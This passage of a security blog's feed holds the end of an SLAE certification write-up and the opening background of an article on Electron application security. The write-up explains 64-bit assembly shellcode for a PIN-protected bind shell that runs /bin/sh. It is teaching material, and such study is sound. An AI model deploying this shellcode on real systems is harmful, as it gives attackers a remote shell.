	&lt;span class=&quot;nx&quot;&gt;xor&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rsi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rsi&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rsi&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rsi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x3a4e4950&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rsi&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rsi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rsp&lt;/span&gt;

	&lt;span class=&quot;nx&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x1&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;syscall&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;For the &lt;code class=&quot;highlighter-rouge&quot;&gt;read()&lt;/code&gt; syscall we again have the correct fd in RDI already. This time we will be using RSI to hold the address value of the buffer where we will store the value submitted by the client. The number of bytes to be read is specified in RDX. As we are expecting a 4 digit PIN we will need to allocate a 4 byte long buffer (&lt;code class=&quot;highlighter-rouge&quot;&gt;sub rsp,4&lt;/code&gt;) and adjust the stack pointer to point to the beginning of the buffer (&lt;code class=&quot;highlighter-rouge&quot;&gt;mov rsi, rsp&lt;/code&gt;). Next we specify with &lt;code class=&quot;highlighter-rouge&quot;&gt;add rdx, 0x4&lt;/code&gt; that we want 4 bytes of data to be read and not more.&lt;/p&gt;

&lt;div class=&quot;language-js highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;read&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
	&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;ssize_t&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;read&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kr&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;fd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;size_t&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;count&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;sub&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rsp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rsi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rsp&lt;/span&gt;

	&lt;span class=&quot;nx&quot;&gt;xor&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rdx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rdx&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;add&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rdx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x4&lt;/span&gt;

	&lt;span class=&quot;nx&quot;&gt;xor&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rax&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;syscall&lt;/span&gt;

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h4 id=&quot;desicion-making-time&quot;&gt;&lt;b&gt;Desicion making time&lt;/b&gt;&lt;/h4&gt;

&lt;p&gt;So we have told the client that we expect a PIN code, and we have received and read 4 bytes of data as PIN code. How do we decide if we will execute the &lt;code class=&quot;highlighter-rouge&quot;&gt;/bin/sh&lt;/code&gt; or not? At this point we know that user input sits on the top of our stack at where RSP points to, so what we can do is check byte by byte whether these bytes correspond to what we are expecting them to. That is what’s happening at each &lt;code class=&quot;highlighter-rouge&quot;&gt;mov bl, byte [rsp+...]&lt;/code&gt;. We take 1 byte of data, compare it with the hex value. If they are equal we continue and take the next byte, same comparison follows. If, however, the 2 bytes do not equal we immediately jump the the exit and end the program.&lt;/p&gt;

&lt;p&gt;As we are doing the last, 4th comparison and the bytes are equal (we have correct PIN), the jump will be made to &lt;code class=&quot;highlighter-rouge&quot;&gt;execve()&lt;/code&gt; instead of &lt;code class=&quot;highlighter-rouge&quot;&gt;exit()&lt;/code&gt;. Let’s see how do we implement the &lt;code class=&quot;highlighter-rouge&quot;&gt;execve()&lt;/code&gt; syscall in order to have shell back.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/SLAE/desicion.png&quot; alt=&quot;desicion&quot; /&gt;&lt;/p&gt;

&lt;div class=&quot;language-js highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nx&quot;&gt;cmpinput&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;xor&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rbx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rbx&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;bl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;byte&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;rsp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;xor&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rcx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rcx&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rcx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x31&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;cmp&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rbx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rcx&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;jne&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;exit&lt;/span&gt;

	&lt;span class=&quot;nx&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;bl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;byte&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;rsp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rcx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x32&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;cmp&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rbx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rcx&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;jne&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;exit&lt;/span&gt;

	&lt;span class=&quot;nx&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;bl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;byte&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;rsp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rcx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x33&lt;/span&gt;
        &lt;span class=&quot;nx&quot;&gt;cmp&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rbx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rcx&lt;/span&gt;
        &lt;span class=&quot;nx&quot;&gt;jne&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;exit&lt;/span&gt;

	&lt;span class=&quot;nx&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;bl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;byte&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;rsp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rcx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x34&lt;/span&gt;
        &lt;span class=&quot;nx&quot;&gt;cmp&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rbx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rcx&lt;/span&gt;
        &lt;span class=&quot;nx&quot;&gt;je&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;execve&lt;/span&gt;

&lt;span class=&quot;nx&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;						&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;jump&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;here&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;bytes&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;do&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;not&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;match&lt;/span&gt;
        &lt;span class=&quot;nx&quot;&gt;xor&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rdi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rdi&lt;/span&gt;
        &lt;span class=&quot;nx&quot;&gt;xor&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rax&lt;/span&gt;
        &lt;span class=&quot;nx&quot;&gt;add&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;60&lt;/span&gt;
        &lt;span class=&quot;nx&quot;&gt;syscall&lt;/span&gt;

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h4 id=&quot;finale---execve&quot;&gt;&lt;b&gt;Finale - execve()&lt;/b&gt;&lt;/h4&gt;

&lt;p&gt;Execve() takes 3 arguments: the file we want to execute which for us is the &lt;code class=&quot;highlighter-rouge&quot;&gt;/bin/sh&lt;/code&gt;, as we it is a pointer &lt;code class=&quot;highlighter-rouge&quot;&gt;const char *filename&lt;/code&gt; we need RDI to contain the address on which we have stored the program name. This is the reason why we first move the string in hex to RBX, push on the top of the stack and then move the address to RDI.&lt;/p&gt;

&lt;p&gt;Next we need to get the address of an array of string constants &lt;code class=&quot;highlighter-rouge&quot;&gt;{&quot;/bin/sh&quot;, NULL};&lt;/code&gt; to RSI. For that we can just push the address we have at RDI to the top of the stack and move that stack address to RSI.&lt;/p&gt;

&lt;p&gt;Third, we do not want to pass any environment variables, so we can make the 3rd argument just 0. So to finish it up, let’s check the &lt;code class=&quot;highlighter-rouge&quot;&gt;execve()&lt;/code&gt; syscall number via &lt;code class=&quot;highlighter-rouge&quot;&gt;ausyscall execve&lt;/code&gt;, read it to RAX and have a go on the last syscall for this task.&lt;/p&gt;

&lt;div class=&quot;language-js highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nx&quot;&gt;execve&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
	&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;kr&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;execve&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kd&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;filename&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;kd&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[],&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;kd&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;envp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]);&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;xor&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rdi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rdi&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;xor&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;rax&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rax&lt;/span&gt;

	&lt;span class=&quot;nx&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rbx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x68732f6e69622f&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rbx&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rdi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rsp&lt;/span&gt;

	&lt;span class=&quot;nx&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rax&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rdx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rsp&lt;/span&gt;

	&lt;span class=&quot;nx&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rdi&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rsi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rsp&lt;/span&gt;

	&lt;span class=&quot;nx&quot;&gt;add&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;59&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;syscall&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;hr /&gt;

&lt;ul&gt;
  &lt;li&gt;Full assembly code can be found at:&lt;br /&gt; &lt;a href=&quot;https://github.com/silviavali/SLAE/blob/master/task1/bindshell.nasm&quot;&gt;https://github.com/silviavali/SLAE/blob/master/task1/bindshell.nasm&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;Full C code:&lt;br /&gt; &lt;a href=&quot;https://github.com/silviavali/SLAE/blob/master/task1/bindshell.c&quot;&gt;https://github.com/silviavali/SLAE/blob/master/task1/bindshell.c&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&quot;related-posts&quot;&gt;Related posts:&lt;/h4&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://silviavali.github.io/blog/2019-01-15-blog-SLAE1/&quot;&gt;64-bit bindshell with a passphrase protection&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://silviavali.github.io/blog/2019-01-25-blog-SLAE2/&quot;&gt;64-bit reverse shell with passphrase protection&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://silviavali.github.io/blog/2019-02-25-blog-SLAE3/&quot;&gt;Egghunter (64-bit Linux) using access() syscall&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://silviavali.github.io/blog/2019-02-25-blog-SLAE4/&quot;&gt;Writing a 64-bit custom encoder (reversed byte order of 4 byte chunks)&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://silviavali.github.io/blog/2019-05-01-blog-SLAE51/&quot;&gt;Msfvenom generated Exec shellcode analysis - exec shellcode&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://silviavali.github.io/blog/2019-05-01-blog-SLAE52/&quot;&gt;Msfvenom generated bind_tcp shellcode analysis&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://silviavali.github.io/blog/2019-05-01-blog-SLAE53/&quot;&gt;Msfvenom generated shell_reverse_tcp payload&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://silviavali.github.io/blog/2019-05-01-blog-SLAE6/&quot;&gt;Polymorphic shellcodes for samples taken from Shell-Storm&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://silviavali.github.io/blog/2019-05-01-blog-SLAE7/&quot;&gt;Custom encrypter - One-time pad (OTP)&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</content><author><name>Silvia Väli</name><email>silvia@protonmail.com</email></author><summary type="html">This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert Certification. The task for 1/7 assignment is to create a 64-bit bindshell with a password protection. If the password is entered correctly, only then the shell gets executed. All 0-bytes should be removed.</summary></entry><entry><title type="html">Only an Electron Away from Code Execution</title><link href="http://localhost:4000/blog/2018-12-01-electron/" rel="alternate" type="text/html" title="Only an Electron Away from Code Execution" /><published>2018-12-01T00:00:00+02:00</published><updated>2018-12-01T00:00:00+02:00</updated><id>http://localhost:4000/blog/electron</id><content type="html" xml:base="http://localhost:4000/blog/2018-12-01-electron/">&lt;p&gt;This article is supporting my talk at the &lt;a href=&quot;https://nsec.io/speakers/#silvia-v-li&quot;&gt;NorthSec 2018&lt;/a&gt; conference in Montreal titled “Only an Electron Away from Code Execution” and the corresponding slides can be found &lt;strong&gt;&lt;a href=&quot;https://docs.google.com/presentation/d/1uJDFQncxCB_0CddZSPVCq7FhKQVH6ku_RuV17Pbm2RU/edit?usp=sharing&quot;&gt;here&lt;/a&gt;&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;Electron framework enables to create multi-platform desktop applications by only using web technologies like HTML, JavaScript and CSS. This has allowed the adventurous web application developers to cross the border over to the desktop environment with ease. Big names like Skype, Wire, GitKraken, Slack and so many others have already adopted the framework and tons of open source projects in Github and the ones advertised on the official Electron website have followed. Exploring new frameworks is good, but should be done with good caution! I will explain why.&lt;/p&gt;

&lt;p&gt;Over the decades, various security techniques to mitigate desktop specific vulnerabilities have been developed, which makes it difficult to successfully exploit traditional desktop applications. Now, when the web technologies have been released into the ‘wild’ a.k.a to the desktop in this case, the web-based vulnerabilities should be reappraised as the consequences can be significantly different than expected. To get to the main part of this article, let me feed you some background information.&lt;/p&gt;

&lt;h3 id=&quot;multi-process-architecture&quot;&gt;&lt;strong&gt;Multi-process architecture&lt;/strong&gt;&lt;/h3&gt;

&lt;p&gt;When I am talking about the Electron framework, it really means talking about its 3 core components: Node.js, the libchromiumcontent module from the Chromium project (the core code needed to render a page) and the V8 JavaScript engine. Similarly to Chromium, Electron uses a multi-process architecture. What this means is that if you take a look at a launched Electron application, you would notice 2 types of processes being created: 1 main process and 1 or multiple renderer processes associated with it. Each of those processes is running concurrently with others and their resources as well as the memory are isolated from eachother. This here works sort of like a safety mechanism.&lt;/p&gt;

&lt;h4 id=&quot;main-process&quot;&gt;&lt;strong&gt;Main process&lt;/strong&gt;&lt;/h4&gt;

&lt;p&gt;To avoid the information overload, let’s focus here on couple of the key points about the processes. The main process in Electron applications is what is responsible for creating and managing web pages and for a life-cycle of events throughout the life-time of the application. Renderer process however is responsible for displaying the chosen content to the user. To paint you a bigger picture of how Electron apps can look like, let’s take the simplest example possible. An Electron app which consists of 3 files: main.js, index.html and package.json.&lt;/p&gt;

&lt;div class=&quot;language-js highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nx&quot;&gt;Electron&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;application&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;example&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;__&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;index&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;html&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;__&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;js&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;__&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;package&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;json&lt;/span&gt;    &lt;span class=&quot;err&quot;&gt;←&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;application&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;’&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;s&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;entry&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;point&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Package.json is what holds the main script, which in our example is the file called main.js. If not specified, it would always fall back to index.js by default. This is the script which gets executed within the main process. You can imagine it to be the entry point to the application. Now, index.html however is what contains the actual page content we want to display to our user. This would be executed within the renderer process. &lt;strong&gt;A new renderer process is created with every browserWindow instance created in the main process.&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Electron framework, in order to provide you the desktop-like experience, allows the developers to make use of all
the built-in Node.js modules. In addition, it comes with a set of framework specific APIs accessible to the main or to the renderer processes and in some cases to both. The entire list of framework specific APIs which Electron provides you can be found in &lt;a href=&quot;https://electronjs.org/docs/api&quot;&gt;here&lt;/a&gt;. One of those APIs available to the main process is the &lt;a href=&quot;https://electronjs.org/docs/api/browser-window&quot;&gt;BrowserWindow API&lt;/a&gt; from which the BrowserWindow method can be used to create a new page.&lt;/p&gt;

&lt;p&gt;An example from main.js where new BrowserWindow instance is created with specific size attributes to display the content of index.html:&lt;/p&gt;
&lt;div class=&quot;language-js highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kd&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;BrowserWindow&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;require&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'electron'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

  &lt;span class=&quot;kd&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;win&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;BrowserWindow&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;({&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;width&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;800&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;height&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;600&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;})&lt;/span&gt;
  &lt;span class=&quot;nx&quot;&gt;win&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;on&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'closed'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;nx&quot;&gt;win&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;})&lt;/span&gt;

  &lt;span class=&quot;nx&quot;&gt;win&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;loadURL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'....example/index.html'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
